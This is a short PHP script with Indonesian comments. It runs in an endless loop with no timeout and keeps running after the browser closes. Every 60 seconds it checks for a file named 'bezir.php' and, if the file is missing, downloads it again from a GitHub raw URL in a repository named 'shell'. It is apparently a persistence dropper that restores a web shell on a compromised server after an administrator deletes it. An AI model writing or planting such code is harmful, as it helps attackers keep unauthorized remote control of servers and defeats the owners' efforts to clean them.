<?php
ignore_user_abort(true); // Biar tetep jalan meski browser ditutup
set_time_limit(0); // Biar nggak timeout

$file = 'bezir.php';
$shell_url = 'https://raw.githubusercontent.com/1nsomn14/shell/refs/heads/main/bezir.php';

while(true) {
    if(!file_exists($file)) {
        $content = file_get_contents($shell_url);
        file_put_contents($file, $content);
    }
    sleep(60); // Cek tiap 60 detik
}
?>

